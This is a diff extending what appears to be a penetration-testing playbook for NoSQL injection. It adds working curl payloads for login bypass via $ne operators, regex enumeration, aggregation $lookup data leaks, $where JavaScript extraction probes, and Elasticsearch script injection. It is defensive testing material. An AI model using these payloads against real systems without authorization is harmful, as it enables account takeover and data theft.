@@ -46,6 +46,26 @@ run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
   --data '{"username":"probe","$or":[{"username":"probe"},{"username":{"$ne":""}}]}' # logical-operator probe
 ```
 
+### 2b. URL-Encoded / Form-Body Operator Injection
+Many backends only strip operators from JSON bodies but leave `application/x-www-form-urlencoded` bracket-array parsing (PHP `$_POST`, some Express `qs`/`body-parser` configs) untouched — this reaches the same Mongo driver without ever sending a raw JSON object.
+
+```bash
+run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
+  -d 'username=probe&password[$ne]=1'                       # PHP-array-style operator via form body
+run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
+  -d 'username[$regex]=^adm&password[$ne]=1'                # combine field-enumeration with auth-bypass
+run_tool curl -sS --connect-timeout 5 --max-time 20 "$SEARCH_URL?filter[\$gt]="                # query-string bracket operator on GET
+```
+
+### 2c. Aggregation Pipeline Injection
+If the app exposes a MongoDB aggregation-based filter/report endpoint (`$lookup`, `$match`, `$group` built from user input), operator injection can pivot into cross-collection joins that leak data outside the queried collection.
+
+```bash
+run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$FILTER_URL" -H 'Content-Type: application/json' \
+  --data '{"match":{"$or":[{"_id":{"$exists":true}}]},"lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"leak"}}'
+```
+Treat any pipeline stage name (`$lookup`, `$unionWith`, `$merge`, `$out`) reachable from user input as a high-severity finding on its own — `$merge`/`$out` can write attacker-controlled data into another collection.
+
 ### 3. Test Type Confusion
 Compare array versus scalar and integer versus string. MongoDB, CouchDB, and Redis may coerce or reject each shape differently; a backend-specific result is not a universal bypass.
 
@@ -101,6 +121,28 @@ run_tool curl -sS --connect-timeout 5 --max-time 20 -w 'TIME=%{time_total}\n' \
 run_tool curl -sS --connect-timeout 5 --max-time 20 -w 'TIME=%{time_total}\n' \
   -X POST "$LOGIN_URL" -H 'Content-Type: application/json' \
   --data '{"username":"probe","$where":"sleep(2000)"}' # sleep-only timing probe
+```
+
+### 6b. `$where` / `mapReduce` JavaScript Injection (beyond timing)
+Where `$where` or `mapReduce` reaches raw JS execution inside the Mongo server context, a confirmed timing signal (step 6) can sometimes escalate to data exfiltration through the same channel — still bounded to one or two probes, never a scripted extraction loop here (hand that to `exploit-developer`).
+
+```bash
+run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" -H 'Content-Type: application/json' \
+  --data '{"username":"probe","$where":"this.username==this.username"}'  # tautology confirms $where reaches server-side JS eval
+run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" -H 'Content-Type: application/json' \
+  --data '{"username":"probe","$where":"function(){return this.password.match(/^a/)}"}'  # boolean-extraction primitive, confirm signal only
+```
+
+### 6c. Non-Mongo Backends: CouchDB Mango & Elasticsearch/OpenSearch DSL
+Treat these as distinct engines with their own operator injection surface when the target's stack uses them instead of/alongside MongoDB.
+
+```bash
+run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$COUCHDB_URL/_find" -H 'Content-Type: application/json' \
+  --data '{"selector":{"username":{"$eq":"probe"},"password":{"$gt":null}}}'   # CouchDB Mango selector, same $gt/$ne family
+run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$ES_URL/_search" -H 'Content-Type: application/json' \
+  --data '{"query":{"query_string":{"query":"username:probe AND password:*"}}}' # Elasticsearch query_string operator injection if user input reaches Lucene syntax unescaped
+run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$ES_URL/_search" -H 'Content-Type: application/json' \
+  --data '{"script_fields":{"x":{"script":{"source":"1==1"}}}}'                # confirm whether user input can reach `script.source` (RCE-class if scripting is enabled and input is unsanitized)
 ```
 
 ### 7. Run Bounded Tool Fallbacks
